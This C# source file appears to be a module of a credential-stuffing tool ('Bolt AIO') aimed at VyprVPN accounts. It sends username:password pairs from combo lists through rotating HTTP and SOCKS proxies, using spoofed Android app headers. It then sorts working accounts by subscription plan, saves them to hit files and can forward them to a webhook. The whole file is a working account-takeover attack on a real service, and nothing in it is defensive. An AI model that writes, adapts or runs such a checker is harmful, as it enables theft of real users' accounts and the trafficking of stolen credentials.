using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading;
using BoltCUI;
using Leaf.xNet;

namespace Bolt_AIO
{
    internal class Vypervpnmod
    {
        public static List<string> Combos = Program.Combos;
        public static int Combosindex;

        public static string genIP()
        {
            var random = new Random();
            return string.Concat(random.Next(1, 255).ToString(), ".", random.Next(0, 255).ToString(), ".",
                random.Next(0, 255).ToString(), ".", random.Next(0, 255).ToString());
        }

        public static void Check()
        {
            for (;;)
            {
                if (Program.Proxyindex > Program.Proxies.Count() - 2) Program.Proxyindex = 0;
                try
                {
                    Interlocked.Increment(ref Program.Proxyindex);
                    using (var req = new HttpRequest())
                    {
                        if (Combosindex >= Combos.Count())
                        {
                            Program.Stop++;
                            break;
                        }

                        Interlocked.Increment(ref Combosindex);
                        var array = Combos[Combosindex].Split(':', ';', '|');
                        var text = array[0] + ":" + array[1];
                        try
                        {
                            switch (Program.ProxyType1)
                            {
                                case "HTTP":
                                    req.Proxy = HttpProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                                case "SOCKS4":
                                    req.Proxy = Socks4ProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                                case "SOCKS5":
                                    req.Proxy = Socks5ProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                            }

                            req.AllowAutoRedirect = false;
                            req.Cookies = new CookieDictionary();
                            req.IgnoreProtocolErrors = true;
                            req.UserAgent = "okhttp/2.3.0";
                            req.AddHeader("username", array[0]);
                            req.AddHeader("password", array[1]);
                            req.AddHeader("X-GF-Agent", "VyprVPN Android v2.19.0.7702. (56aa5dfd)");
                            req.AddHeader("X-GF-PRODUCT", "VyprVPN");
                            req.AddHeader("X-GF-PRODUCT-VERSION", "2.19.0.7702");
                            req.AddHeader("X-GF-PLATFORM", "Android");
                            req.AddHeader("X-GF-PLATFORM-VERSION", "6.0");
                            req.SslCertificateValidatorCallback =
                                (RemoteCertificateValidationCallback) Delegate.Combine(
                                    req.SslCertificateValidatorCallback,
                                    new RemoteCertificateValidationCallback((obj, cert, ssl, error) =>
                                        (cert as X509Certificate2).Verify()));
                            var text3 = req.Get("https://api.goldenfrog.com/settings").ToString();
                            var flag7 = text3.Contains("confirmed\": true");
                            if (flag7)
                            {
                                var text4 = Parse(text3, "\"account_level_display\": \"", "\"");
                                Program.Hits++;
                                Program.TotalChecks++;
                                Export.AsResult("/Vypervpn_hits", array[0] + ":" + array[1] + " | Plan: " + text4);
                                if (Program.lorc == "LOG")
                                    Settings.PrintHit("VyperVPN", array[0] + ":" + array[1] + " | Plan: " + text4);
                                if (Settings.sendToWebhook)
                                    Settings.sendTowebhook1(array[0] + ":" + array[1] + " | Plan: " + text4,
                                        "Vyper VPN Hits");
                            }
                            else
                            {
                                var flag9 = text3.Contains("invalid username or password");
                                if (flag9)
                                {
                                    Program.Fails++;
                                    Program.TotalChecks++;
                                }
                                else
                                {
                                    var flag10 = text3.Contains("vpn\": null");
                                    if (flag10)
                                    {
                                        Program.Frees++;
                                        Program.TotalChecks++;
                                        Export.AsResult("/Vypervpn_frees", array[0] + ":" + array[1]);
                                        if (Program.lorc == "LOG")
                                            Settings.PrintFree("VyperVPN", array[0] + ":" + array[1]);
                                    }
                                    else
                                    {
                                        var flag15 = text3.Contains("locked");
                                        if (!flag15)
                                        {
                                            Program.Frees++;
                                            Program.TotalChecks++;
                                            Export.AsResult("/Vypervpn_locked", array[0] + ":" + array[1]);
                                        }
                                        else if (text3.Contains("Your browser didn't send a complete request in time"))
                                        {
                                            Program.Fails++;
                                            Program.TotalChecks++;
                                        }
                                    }
                                }
                            }
                        }
                        catch (Exception)
                        {
                            Program.Combos.Add(text);
                        }
                    }
                }
                catch
                {
                    Interlocked.Increment(ref Program.Errors);
                }
            }
        }

        private static string Parse(string source, string left, string right)
        {
            return source.Split(new string[1] {left}, StringSplitOptions.None)[1].Split(new string[1]
            {
                right
            }, StringSplitOptions.None)[0];
        }

        public static string Base64Encode(string plainText)
        {
            return Convert.ToBase64String(Encoding.UTF8.GetBytes(plainText));
        }

        internal class CookieDictionary : CookieStorage
        {
            public CookieDictionary(bool isLocked = false, CookieContainer container = null) : base(isLocked, container)
            {
            }
        }
    }
}